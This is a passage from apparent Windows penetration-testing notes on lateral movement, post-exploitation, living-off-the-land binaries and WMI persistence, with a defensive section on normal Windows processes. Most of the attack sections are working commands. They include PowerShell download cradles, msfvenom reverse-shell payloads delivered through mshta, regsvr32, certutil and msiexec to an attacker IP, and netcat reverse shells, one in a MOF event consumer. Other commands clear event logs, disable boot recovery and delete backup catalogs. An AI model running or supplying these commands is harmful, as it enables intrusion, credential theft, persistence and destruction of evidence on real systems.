    wmic sysaccount list /format:list  
    ```
    - <https://techcommunity.microsoft.com/t5/Ask-The-Performance-Team/Useful-WMIC-Queries/ba-p/375023>
    - <https://windowstech.net/wmic-commands/>
    - Can query remotely.
    - Logging for WMI events is disabled by default: <https://msdn.microsoft.com/en-us/library/windows/desktop/aa826686(v=vs.85).aspx>
    ```
    wmic
    wmic> /node:"machinename" /user:"username" computerystem list full /format:list
    ```
    - Local admins on a remote machine
    ```
    wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")  
    ```
    - Who is logged-in: `wmic /node:ordws01 path win32_loggedonuser get antecedent`
    - Read nodes from text file: `wmic /node:@workstations.txt path win32_loggedonuser get antecedent  `
    - Execute command:
    ```
    powershell.exe -NoP -sta -NonI -W Hidden -Enc JABXAEMAPQBOAEUAVwAtAE8AQgBKAGUAQw...truncated...  
    ```
    ```
    wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"  
    ```
    - Used in:
        - <https://github.com/samratashok/nishang>
        - <https://github.com/PowerShellMafia/PowerSploit>
        - CrackMapExec
        - wmiexec.py
        - wmis
- pth-wmis
  - pth-wmis doesn’t work on 64 bit Kali, however, pth-wmic works with no issues and apparently this has been a problem since 2013. After downloading the 32 bit version of pth-wmis and the required libraries, we are back up and running.
    ```
    echo "iex (New-Object Net.WebClient).DownloadString('http://172.16.67.128:80/6WcepYO')" | iconv --to-code UTF-16LE | base64 -w 0
    kaliwmis-32 -U administrator%badpassword //10.10.10.10 "cmd.exe /c  powershell.exe -nop -enc <base64-value>"
    ```
- Windows Remote Management (WinRM)
  - 5985/tcp (HTTP) / 5986/tcp (HTTPS)
  - Allows remote management of Windows machines over HTTP(S) using SOAP.
  - On the backend it's utilizing WMI.
  - Enable: `Enable-PSRemoting -Force Set-Item wsman:\localhost\client\trustedhosts *`
  - Test if target is configured for WinRM: `Test-WSMan machinename`
  - Execute command: `Invoke-Command -Computer ordws01 -ScriptBlock {ipconfig /all} -credential CSCOU\jarrieta  `
      - Command line: `Enter-PSSession -Computer ordws01 -credential CSCOU\jarrieta `
  - Force enabling WinRM:
  ```
  PS C:\tools\SysinternalsSuite> .\PsExec.exe \\ordws04 -u cscou\jarrieta -p nastyCutt3r -h -d powershell.exe "enable-psremoting -force"  
  ```
- CrackMapExec
  - "-x" parameter to send commands.
  - wmiexec.py across multiple IPs
- Using Remote Desktop
  - Impacket's rdp_check to see if you have RDP access,
  - Then use Kali's rdesktop to connect:
- Invoke command with credentials
    ```
    $user = '.\administrator';
    $psw = '1234test';
    $secpsw = ConvertTo-SecureString $psw -AsPlainText -Force;
    $credential = New-Object System.Management.Automation.PSCredential $user, $secpsw
    ```
    ```
    invoke-command -computername localhost -credential $credential
    -scriptblock {cd C:\Users\Administrator\Desktop\;C:\Users\Administrator\Desktop\root.exe}
    ```
    
## General Exploits

## Post Exploitation 

- Patch level  
  - `systeminfo`
  - `wmic qfe get Caption,Description,HotFixID,InstalledOn`
- User info
  - `whoami`
  - `echo %USERNAME%  `
  - `net user  `
  - `net localgroup  `
  - `net user /domain  `
  - `net group /domain  `
  - `net group /domain <Group Name>  `
- Firewall  
  - `netsh firewall show state  `
  - `netsh firewall show config  `
- Network  
  - `ipconfig /all  `
  - `route print  `
  - `arp -A  `
- Scheduled Tasks  
  - `schtasks /query /fo LIST /v  ` --copy output and save in txt  
  - `cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM`  
  - `dir %SystemRoot%\Tasks  `
    - e.g. c:\windows\tasks\  
    - e.g. c:\windows\system32\tasks\  
- Services  
  - Check service config can be modify or not  
    ```bat
    accesschk.exe /accepteula  
    accesschk.exe -uwcqv "Authenticated Users" * /accepteula  
    accesschk.exe -ucqv \<Service Name>  
    ```
    ```bat
    sc qc \<Service Name> -- Get service details  
    ```
  - Check service with weak file permission  
    ```bat
    for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
    for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"  
    ```
    ```bat
    sc.exe  
    sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt  
    FOR /F %i in (Servicenames.txt) DO echo %i  
    type Servicenames.txt  
    FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt  
    FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt  
    ```
  - Unquoted Service Path  
    ```bat
    wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """  
    sc query  
    sc qc service name  
    ```
  - AlwaysInstallElevated << IF 64 bits use:  %SystemRoot%\Sysnative\reg.exe  
    ```
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  
    ```
  - Service only available from inside  
    ```
    netstat -ano  
    upload plink.exe  
    plink.exe -R "remote port":127.0.0.1:"local port"  root@"ipaddress"
    ```
- Passwords in files/registry
  - <https://pentestlab.blog/tag/privilege-escalation/page/3/>
  - `cmdkey /list` If there are entries, it means that we may able to runas certain user who stored his cred in windows  
    - `runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \\IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"`
  - SAM file
    ```
    %SYSTEMROOT%\repair\SAM  
    %SYSTEMROOT%\System32\config\RegBack\SAM  
    %SYSTEMROOT%\System32\config\SAM  
    %SYSTEMROOT%\repair\system  
    %SYSTEMROOT%\System32\config\SYSTEM  
    %SYSTEMROOT%\System32\config\RegBack\system  
    ```
  - Find
    ```
    findstr /si password *.txt  
    findstr /si password *.xml  
    findstr /si password *.ini  
    findstr /si pass/pwd *.ini  
    ```
    ```
    dir /s *pass* == *cred* == *vnc* == *.config*  
    ```
    ```
    findstr /spin "password" *.*  
    findstr /spin "password" *.*  
    ```
  - Specific credential files:
    ```
    Unattended? vnc?  
    c:\sysprep.inf  
    c:\sysprep\sysprep.xml  
    c:\unattend.xml  
    %WINDIR%\Panther\Unattend\Unattended.xml  
    %WINDIR%\Panther\Unattended.xml  
    ```
    ```
    dir /b /s unattend.xml  
    dir /b /s web.config  
    dir /b /s sysprep.inf  
    dir /b /s sysprep.xml  
    dir /b /s *pass*  
    ```
    ```
    dir c:\*vnc.ini /s /b  
    dir c:\*ultravnc.ini /s /b   
    dir c:\ /s /b | findstr /si *vnc.ini  
    ```
  - VNC  
    ```
    reg query "HKCU\Software\ORL\WinVNC3\Password"  
    reg query "HKCU\Software\TightVNC\Server"  
    ```
  - Windows autologin  
    ```
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  
    ```
  - SNMP Paramters: `reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  `
  - Putty: `reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"`
  - Search for password in registry  
    ```
    reg query HKLM /f password /t REG_SZ /s  
    reg query HKCU /f password /t REG_SZ /s  
    ```

## Important Files

- Collections
  - Windows EXE / DLL files: <http://www.saule-spb.ru/touch/windows_files.html>
  - Living Off The Land Binaries and Scripts: <https://lolbas-project.github.io/> <https://github.com/LOLBAS-Project/LOLBAS>
  - <https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows>
- During LFI: 
    ```
    %SYSTEMROOT%\repair\system
    %SYSTEMROOT%\repair\SAM
    %SYSTEMROOT%\repair\SAM
    %WINDIR%\win.ini
    %SYSTEMDRIVE%\boot.ini
    %WINDIR%\Panther\sysprep.inf
    %WINDIR%\system32\config\AppEvent.Evt
    ```
- Version information
  - `sysinfo`
  - Windows 7+: `/windows/system32/license.rtf`
  - `/windows/system32/eula.txt`
- Updates:
  - Update information: `WindowsUpdate.log`
  - Update Download locations: `C:\Windows\SoftwareDistribution\Download`
- wbadmin / ntbackup
  - <https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin>
  - Perform backups and restores of operating systems, drive volumes, computer files, folders, and applications from a command-line interface.
  - Delete any recovery catalogs:
    ```
    cmd.exe /c wbadmin.exe delete catalog -quiet
    ```
- BCDEdit
  - <https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/bcdedit-command-line-options>
  - Tool for managing Boot Configuration Data (BCD). BCD files provide a store that is used to describe boot applications and boot application settings.
  - Usable to creating new stores, modifying existing stores, adding boot menu options, and so on.
  - Windows recovery console does not attempt to repair anything:
    ```
    cmd.exe /c bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no
    ```
- wevtutil
  - <https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil>
  - Enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs.
  - Clear System and Security logs:
    ```
    cmd.exe /c wevtutil.exe cl System
    cmd.exe /c wevtutil.exe cl Security
    ```
- DUMPBIN
  - <https://docs.microsoft.com/en-us/cpp/build/reference/dumpbin-reference?view=vs-2017>
  - Displays information about Common Object File Format (COFF) binary files. You can use DUMPBIN to examine COFF object files, standard libraries of COFF objects, executable files, and dynamic-link libraries (DLLs).
- HTA
  - Application where source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript. An HTA executes without the constraints of the internet browser security model; it executes as a "fully trusted" application.
- Mshta.exe (HTA)
  - Running HTA( HTML Application) files
    ```
    use exploit/windows/misc/hta_server
    msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
    msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
    msf exploit(windows/misc/hta_server) > exploit
    ```
    ```
    mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta
    ```
- Rundll32.exe
  - Invoke a function exported from a DLL
    ```
    use exploit/windows/smb/smb_delivery
    msf exploit(windows/smb/smb_delivery) > set srvhost 192.168.1.109
    msf exploit(windows/smb/smb_delivery) > exploit
    ```
    ```
    rundll32.exe \\192.168.1.109\vabFG\test.dll,0
    ```
- Regsvr32.exe
  - Register and unregister OLE controls, such as DLLs and ActiveX controls in the Windows Registry
  - installed in the %systemroot%\System32
  - Windows XP and later
  - Regsvr32 uses “squiblydoo” technique for bypassing application whitelisting
  - Execute Script Via regsvr32.exe <https://gist.github.com/coh7eiqu8thaBu/809f49aa24ace2b9f326ab419f7b124a>
  - Squiblydoo utilizes the binary regsvr32.exe to download an XML file that contains scriptlets for executing code: <https://www.carbonblack.com/blog/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/>
  - Able to request a .sct file and then execute the included PowerShell command inside
    ```
    Syntax: Regsvr32 [/s][/u] [/n] [/i[:cmdline]] <dllname>

    /u – Unregister server
    /i – Call DllInstall passing it an optional [cmdline]; when it is used with /u, it calls dll to uninstall
    /n – do not call DllRegisterServer; this option must be used with /i
    /s – Silent; display no message boxes
    ```
    ```
    use exploit/multi/script/web_delivery
    msf exploit (web_delivery)>set target 3
    msf exploit (web_delivery)> set payload windows/meterpreter/reverse_tcp
    msf exploit (web_delivery)> set lhost 192.168.1.109
    msf exploit (web_delivery)>set srvhost 192.168.1.109
    msf exploit (web_delivery)>exploit
    ```
    ```
    regsvr32 /s /n /u /i:http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll
    ```
- Certutil.exe
    ```
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe > shell.exe

    certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
    ```
- Powershell.exe
    ```
    git clone https://github.com/besimorhino/powercat.git
    python -m SimpleHTTPServer 80

    powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"
    ```
- Batch Files
    ```
    msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat

    powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
    ```
- Cscript
    ```
    msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=1234 -f vbs > 1.vbs
    script.exe "test.vbs"

    powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
    ```
- Msiexec.exe
  - Install MSI packages
  ```
  msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi

  msiexec /q /i http://192.168.1.109/1.msi
  ```
- Wmic.exe
  - WMI command-line interface that is used for a variety of administrative functions for local and remote machine
  - can invoke XSL script (eXtensible Stylesheet Language)
  - koadic:
    ```
    use stager/js/wmic
    set SRVHOST 192.168.1.107
    run
    ```
    ```
    wmic os get /FORMAT:"http://192.168.1.107:9996/g8gkv.xsl"
    ```
- Prefetch Files Created
  - AT.EXE (scheduled jobs/tasks)
  - SCHTASKS.EXE (scheduled jobs/tasks)
  - CMD.EXE (Obviously common, but I included it anyway. Especially if the prefetch hash doesn't match the legitimate ones. )
  - NET.EXE (net view, etc.)
  - NET1.EXE (net use)
  - NETSTAT.EXE (netstat -ano)
  - REG.EXE (reg query and reg add)
  - SC.EXE (interact with services)
  - SYSTEMINFO.EXE (system profiling)
  - TASKKILL.EXE (kill running processes)
  - TASKLIST.EXE (tasklist /v)
  - POWERSHELL.EXE (interact with powershell)
  - NBTSTAT.EXE (profile)
  - XCOPY.EXE (copy files around)
  - NSLOOKUP.EXE (profile)
  - QUSER.EXE (profile)
  - RAR.EXE (Exfil or Tool dropping) * And other archive utilities (Ex. 7zip)
  - PING.EXE (check connectivity)
  - FTP.EXE (download/upload)
  - Various Sysinternal tools (Psexec, sdelete, etc.)
  - BITSADMIN.EXE (download/upload)
  - ROUTE.EXE (adding persistent routes)
  - REGSVR32.EXE (services)
  - MAKECAB.EXE (compression before exfil)
  - Originally form: <http://www.sysforensics.org/2014/01/lateral-movement/>. Link is no longer working
- Runonce.exe, msdt.exe, Openwith.exe
  - <https://medium.com/@mattharr0ey/lolbas-blowing-in-the-binaries-path-c480176cc636>
- sethc.exe (Sticky keys)
  - By replacing the “Sticky Keys” binary, C:\Windows\System32\sethc.exe, with the Windows Command Processor cmd.exe, the attackers then accessed a privileged Windows console session without authenticating to the system. “Sticky Keys” is an accessibility feature that allows users to activate Windows modifier keys without pressing more than one key at a time. Pressing the shift key five times activates “Sticky Keys” and executes sethc.exe, which, when replaced with cmd.exe, opens a System-level command shell. From this shell, the attackers can execute arbitrary Windows commands, including adding or modifying accounts on the system, even from the logon screen (pre-authentication).
- Base64 encode / decode
    ```
    certutil -encode inputfile outputfile
    certutil -decode inputfile outputfile
    ```
- `mpengine.dll` (+ mpasbase.vdm mpasdlta.vdm   mpavbase.vdm mpavdlta.vdm)
  - Windows Defender - Microsoft Malware Protection Engine
  - Take buffer of data and decide of malicious or not
- `MPSigStub.exe`
  - Microsoft Malware Protection Signatuee Update Stub  

## Special File Handling

## Important Processes

- Checklist - Simple checklist to review while looking for malicious/suspect process activity.
  - Check the parent/child relationships of processes.
  - Check which users names the processes are running under
  - Check their command line parameters for those processes that use them.
  - Check their digital signatures
  - Check their base priorities
  - Check the location they are being from
  - Check their spellings
  - Leverage memory analysis to detect hidden and/or injected process. Some malware can hide processes by unlinking them (among other ways). Memory analysis is a must these days.
  - When you get comfortable with everything here, dig deeper and check what modules are typically loaded for each process.
  - Check and see if processes that should not be connecting out to the internet are not
  - Check process privileges
  - If wscript.exe process is running check the command line of what it is running.
  - Investigate processes running inside %temp%, root of %appdata%, %localappdata%, recycle bin, etc.
  - If rundll32.exe is running check its command line as well.
  - "Most" legitimate user applications like Adobe, Web browsers, etc. don't spawn child processes like cmd.exe. If you see this, they should be investigated.
  - Core Windows processes shouldn't be communicating out to the internet. If you see communication from these processes, dig deeper. Look for suspicious URLs/IPs, check process strings, etc.
- References
  - <http://sysforensics.org/2014/01/know-your-windows-processes>. Link is not longer working.
  - <https://web.archive.org/web/20151113022252/http://blogs.sans.org/windows-security/files/Process_Hacker_SANS_Jason_Fossen.pdf>
- Idle and System
  - Created by ntoskrnl.exe via the process manager function, which creates and terminates processes and threads.
  - No visible parent processes
  - System has a static PID of 4
  - System creates smss.exe
  - There should only be one system process running
- SMSS - Session Manager
  - First user mode process
  - Parent process is System
  - Base Priority of 11
  - Username: NT AUTHORITY\SYSTEM
  - Performs delayed file delete/rename changes
  - Loads known dlls
  - Runs from %systemroot%\System32\smss.exe
  - Creates session 0 (OS services)
  - Creates session 1 (User session)
  - Creates csrss and winlogon then exits, which is why they have no parent process and they both have session ids of 1
  - Runs within session 0
  - Only one smss.exe process should be running at one time. The second smss.exe process exits, so you will only see the one running in session 0.
  - There can be more sessions if more users are logged on to the system. 0 and 1 are for a single user logged onto the system.
- CSRSS.EXE - Client/Server Run
  - Windows subsystem process.
  - Base Priority of 13
  - %SystemRoot%\system32\csrss.exe
  - Username: NT AUTHORITY\SYSTEM
  - Creates/Deletes processes and threads, Temp files, etc.
  - In XP its used to draw text based console windows. Under Windows 7, the conhost process now does that functionality. For example, cmd.exe
  - One csrss process per session
  - Its name is often used by malware to hide on systems (CSSRS.EXE, CSRSSS.EXE, etc.)
  - Runs within session 0
- WININIT.EXE - Windows Initialization Process
  - Parent to services.exe (SCM), lsass.exe and lsm.exe
  - Created by smss.exe, but since smss.exe exits there is no parent to WININIT.
  - Base Priority of 13
  - Username: NT AUTHORITY\SYSTEM
  - %SystemRoot%\system32\wininit.exe
  - Performs user-mode initialization tasks
  - Creates %windir%\temp
  - Runs within session 0
- SERVICES.EXE - Service Control Manager
  - Child to WININIT.EXE
  - Parent to services such at svchost.exe, dllhost.exe, taskhost.exe, spoolsv.exe, etc. Services are defined in SYSTEM\CurrentControlSet\Services
  - %SystemRoot%\System32\wininit.exe
  - Username: NT AUTHORITY\SYSTEM
  - Base Priority of 9
  - Loads a database of services into memory
  - Runs within session 0
  - There should only be one services.exe process running
- LSASS.EXE - Local Security Authority
  - Child to WININIT.EXE
  - Only one lsass.exe process
  - %SystemRoot%\System32\lsass.exe
  - Responsible for local security policy to include managing users allowed to login, password policies, writing to the security event log, etc.
  - Often targeted by malware as a means to dump passwords. Also mimicked by malware to hide on a system (lass.exe, lssass.exe, lsasss.exe, etc.). These "fake" names will not be a children of wininit.exe.
  - Base Priority of 9
  - Username: NT AUTHORITY\SYSTEM
  - Runs within session 0
  - It should not have child processes
- SVCHOST.EXE - Service Hosting Process
  - Multiple instances of svchost.exe can/do exist/run
  - %SystemRoot%\System32\svchost.exe
  - Username: Should only be one of three options: NT AUTHORITY\SYSTEM, LOCAL SERVICE, or NETWORK SERVICE
  - Should always have a parent of services.exe
  - Base Priority of 8
  - Often mimicked (scvhost, svch0st, etc.) When they are mimicked they will not be running as children to services.exe.
  - Command Line: svchost.exe -k <name>
  - -k <name> values should exist within the Software\Microsoft\Windows NT\CurrentVersion\Svchost registry key
  - Often times when malware uses the actual svchost.exe to load their malicious service they will not include -k command line parameters and be running under a username that does not match on of the three listed in bullet 3.
  - They should all be running within session 0
- LSM.EXE - Load Session Manager Service
  - Manages the state of terminal server sessions on the local machine. Sends the requests to smss.exe to start new sessions.
  - Child to wininit.exe
  - It should not have child processes
  - Receives logon/off, shell start and termination, connect/disconnects from a session, and lock/unlock desktop
  - I have not personally seen malware try and impersonate LSM.exe, but there is always a first so keep your eyes open.
  - %systemroot%\System32\lsm.exe
  - Base Priority of 8
  - Username: NT AUTHORITY\SYSTEM
  - Runs within session 0
- WINLOGON.EXE - Windows Logon Process
  - No parent process
  - Could have a child process of LogonUI if smartcard, etc. are used to authenticate
  - LogonUI will terminate once the user enters their password. Once password is entered the verification is sent over to LSASS and it's verified via Active Directory or SAM (the registry hive SAM), which stores local users and group information.
  - Base Priority of 13
  - Runs within session one
  - Handles interactive user logons/logoffs when SAS keystroke combination is entered (Ctrl+Alt+Delete)
  - Loads Userinit within Software\Microsoft\Windows NT\CurrentVersion\Winlogon
  - The userinit value in the registry should be: Userinit.exe, (note the comma). Malware will sometimes add additional values to this key, which will load malware upon successful logons.
  - Userinit.exe exits once it runs so you wont see this process running when you look.
  - Userinit initializes the user environment. This includes running GPOs and logon scripts.
  - Will run Shell value located at Software\Microsoft\Windows NT\CurrentVersion\Winlogon within the registry. The value of shell should be Explorer.exe. Malware will also use this sometimes to execute malware by adding values.
  - Since Userinit exists this is also why Explorer.exe doesn't have a parent process.
- Explorer.exe - AKA Windows Explorer
  - No parent process since Userinit.exe exits
  - The value "Explorer.exe" is stored in shell value within the registry. The registry location is here: Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
  - Base Priority of 8
  - Username: The logged on user account.
  - %Systemroot%\Explorer.exe
  - This will contain multiple child processes.
  - Some of you might know this better as, "Windows Explorer"
  - This process is often targeted by malware. Malware will often times inject this process. One indication of this is if Explorer.exe is connecting out to the internet. There are other indicators, but that's another post. We are keeping it simple here.

## Windows API

- <https://en.wikipedia.org/wiki/Windows_API#Versions>
- Using Python on Windows: <https://docs.python.org/3/using/windows.html>
- theForger's Win32 API Programming Tutorial: <http://www.winprog.org/tutorial/>
- Windows API Reference: <https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN>

- Network Related
  - ARP Table: `GetIPNetTable`
- Services
  - Change Services: `ChangeServiceConfigW`

## WMI

- Implementation of `Common Information Model (CIM)` and `Web-Based Enterprise Management (WBEM)`
- `WBEM` standard encompasses the design of an
  - extensible enterprise data-collection and data-management facility
  - that has the flexibility and extensibility
  - required to manage local and remote systems that comprise arbitrary components  
- `WMI` consists of four main components:
  - management applications
  - WMI infrastructure
  - providers
  - managed objects (system, disks, processes, network components...)
- Allows
  -  Execute some code when the notification of an event

![](_assets/WMI architecture.png)
> - <http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html>

![image-20190618124144945](_assets/image-20190618124144945.png)
> <https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf>

- CIM classes
  - hierarchically organized with subclasses
  - grouped in namespaces (logical group of classes)
  - root\cimv2 includes most of the classes that represent computer's resources
  - Categories 
    - **Core Classes** - Applies to all areas of management (__System_Security)
    - **Common Classes** - Extension of core classes (CIM_UnitaryComputerSystem)
    - **Extended Classes** - Technology specific addition to common classes (Win32_ComputerSystem)
  - Types
    - **Abstract** - Template classes used to define other classes. 
    - **Static** - Stores data 
      - WMI configuration
      - Operational data
    - **Dynamic** - Retrieved from a provider, and represents managed resource (process, service, file, etc.)
    - **Association** - Describe relationship between classes or resources. 
- WMI Provider 
  - Bridge between managed object and WMI
  - Provide access to classes 
- Namespaces 
  - CIM classes are decided logically using namespaces 
  - For easier discovery and use
  - `root\cimv2` `root\default` `root\security` `root\subscription` 
- WMI repository - stores CIM classes' definitions
  - `%SystemRoot%\System32\wbem\Repository`

### Interesting CIM classes

  - [__EventFilter](http://msdn.microsoft.com/en-us/library/aa394639%28v=vs.85%29.aspx) [[create](http://msdn.microsoft.com/en-us/library/aa389741%28VS.85%29.aspx)]: permits to define a Windows event
  - [__EventConsumer](http://msdn.microsoft.com/en-us/library/aa384749%28VS.85%29.aspx): (abstract consumer class)
    - [ActiveScriptEventConsumer](http://msdn.microsoft.com/en-us/library/aa394635): possible to embed VBScript or JSScript in the consumer (only available in `root\subscription`)
      - Consumer runs with SYSTEM privilege on `Windows XP` and `Windows 2003 Server`
      - `Vista`, it is running under the LOCAL_SERVICE user
  - [__FilterToConsumerBinding](http://msdn.microsoft.com/en-us/library/aa394647%28v=VS.85%29.aspx): link two other instances. (permits to activate the consumer - and to execute its code - whenever the defined event occurs)

### [MOF (Managed Object Format)](http://msdn.microsoft.com/en-us/library/aa823192%28VS.85%29.aspx)

- Language used to describe CIM classes, namespaces and providers 
- MOF file needs to be registered into the CIM/WMI repository in order to be taken into account by WMI
  - CIM class(es) MOF describes are added into the repository
  - Stored in `%SystemRoot%\System32\wbem`
- Compilation
  - Compiled using `mofcomp.exe`
- Auto compile & register
  - Writable to `Administrator` only
  - Files added to  `%SystemRoot%\System32\wbem\mof\` get auto compiled and registered (before Vista)
  - Logs are in `%SystemRoot%\System32\wbem\mof\Logs\mofcomp.log`

Wait for a windows event and trigger:
```powershell
#pragma namespace ("\\\\.\\root\\subscription")

instance of __EventFilter as $FILTER
{
    Name = "CLASS_FIRST_TEST";
    EventNamespace = "root\\cimv2";
 Query = "SELECT * FROM __InstanceCreationEvent "
  "WHERE TargetInstance ISA \"Win32_NTLogEvent\" AND "
  "TargetInstance.LogFile=\"Application\"";

    QueryLanguage = "WQL";
};

instance of ActiveScriptEventConsumer as $CONSUMER
{
    Name = "CLASS_FIRST_TEST";
    ScriptingEngine = "VBScript";

    ScriptText =
      "Set objShell = CreateObject(\"WScript.Shell\")\n"
   "objShell.Run \"C:\\Windows\\system32\\cmd.exe /C C:\\nc.exe 192.168.38.1 1337 -e C:\\Windows\\system32\\cmd.exe\"\n";
};

instance of __FilterToConsumerBinding
{
    Consumer = $CONSUMER ;
    Filter = $FILTER ;
};
```
> - Ref: [http://www.hsc-news.com/archives/2011/000078.html](http://www.hsc-news.com/archives/2011/000078.html)

Self start:
```powershell
#pragma namespace ("\\\\.\\root\\subscription")

class WoootClass
{
 [key]
 string Name;
};

instance of __EventFilter as $FILTER
{
    Name = "XPLOIT_TEST_SYSTEM";
    EventNamespace = "root\\subscription";
 Query = "SELECT * FROM __InstanceCreationEvent "
         "WHERE TargetInstance.__class = \"WoootClass\"";

    QueryLanguage = "WQL";
};

instance of ActiveScriptEventConsumer as $CONSUMER
{
    // ...     
};

instance of __FilterToConsumerBinding
{
    // ...
};

instance of WoootClass
{
 Name = "Woot";
};
```

**Usages**

  - Automatically kill some processes as soon as they are launched (anti-rootkits...),
  - Automatically detect when the backdoor/rootkit has been deleted to load it again (dropper),
  - Automatically infect USB devices

### Exploring 

**Exploring Namespaces**

```powershell
Get-WmiObject -Namespace "root" -Class "__Namespace" | select name
Get-CimInstance  -Namespace "root" -Class "__Namespace" 
```

To read nested namespaces:
```powershell
Get-WmiNamespace 
```

**Exploring Classes**

`-Namespace root\cimv2` is the default of Powershell

```powershell
Get-WmiObject -Class *bios* -List 
```
```powershell
Get-CimClasses -List 
```

List only dynamic classes:
```powershell
Get-CimClasses -QualifierName dynamic -List
```

Look at details of the class:
```powershell
Get-WmiObject -Class Win32_Bios | fl *
```
```powershell
Get-CimInstance -ClassName Win32_Bios | fl *
```

**Using WMI Class**

```powershell
Get-WmiObject -Class Win32_Process | Where-Object {$_.Name -eq "explorer.exe"}

Get-WmiObject -Class Win32_Process | where name -eq "explorer.exe"

Get-WmiObject -Query "Select * from Win32_Process where Name = 'explorer.exe'"
```
```powershell
Get-CimInstance -ClassName Win32_Process -Filter "Name -eq 'explorer.exe'"

Get-CimInstance -Query "Select * from Win32_Process where Name = 'explorer.exe'"
```

Can use `Remove-WmiObject` and `Remove-CimInstance` to close processed, remove registry entries, etc. 

**Methods**

Identifying methods:
```powershell
Get-WmiObject * -List | Where-Object {$_.Method}
(Get-WmiObject -Class Win32_Process -List).Methods 
Get-CimClass -Class Win32_Process -List | Select -ExpandProperty Methods
```
```powershell
Get-CimClass -MethodName * 
Get-CimClass -MethodName *create*
Get-CimClass -ClassName Win32_Process | Select -ExpandProperty CimClassMethods
```

Exploring methods:
```powershell
Get-CimClass -ClassName Win32_Process | Select -ExpandProperty CimClassMethods | where name -eq "Create" | Select -ExpandProperty Parameters
```

Invoke:
```powershell
Invoke-WmiMethod -Class Win32_process -Name create -ArgumentList calc.exe
```
```powershell
Invoke-CimMethod -ClassName Win32_process -MethodName Create -Arguments @{CommandLine = "calc.exe"}
```

**Update Instance**

```powershell
Get-WritableProperties 
```

```powershell
Get-WmiObject -Class Win32_Printer -FIlter "name = 'Microsoft XPS Document Writer'" | Set-WmiInstance -Arguments @{Comment = "Example comment"}
```

```powershell
Get-CimInstancet -ClassName Win32_Printer -FIlter "name = 'Microsoft XPS Document Writer'" | Set-CimInstance -Property @{Comment = "Example comment"}
```

**Associations**

> [https://github.com/dfinke/images/blob/master/acn.png](https://github.com/dfinke/images/blob/master/acn.png)

![acn.png](_assets/acn.png)

```powershell
Get-WmiObject -Class *Win32_NetworkAdapter* -List | fl *
Get-WmiObject -Class Win32_NetworkAdapter -List | fl *

Get-WmiObject -Query "Associators of {win32_NetworkAdapter.DeviceID=11}"
Get-WmiObject -Query "Associators of {win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly"

Get-CimAssociatedInstance -InputObject (Get-CimInstance -ClassName Win32_NetworkAdapter -Filter 'DeviceId = 11')
```

Only see one association class: 
```powershell
Get-WmiObject -Query "Associators of {win32_NetworkAdapter.DeviceID=11}" -AssociationClass Win32_ProtocolBinding 
```

Get references (classes linking two other classes)
```powershell
Get-WimObject -Query "References of {win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly"
Get-WimObject -Query "References of {win32_NetworkAdapter.DeviceID=11}" 
```

### Interesting Queries 

- List all the systems within the current environment/directory:  `SELECT ds_cn FROM ds_computer`
- Installed software: 
- File listing:
- Services:
- Logon accounts:
- Hardware information:
- Installed patches:
- Security logs:
- Command line used to start processes: 
- Path to executable for running processes: 

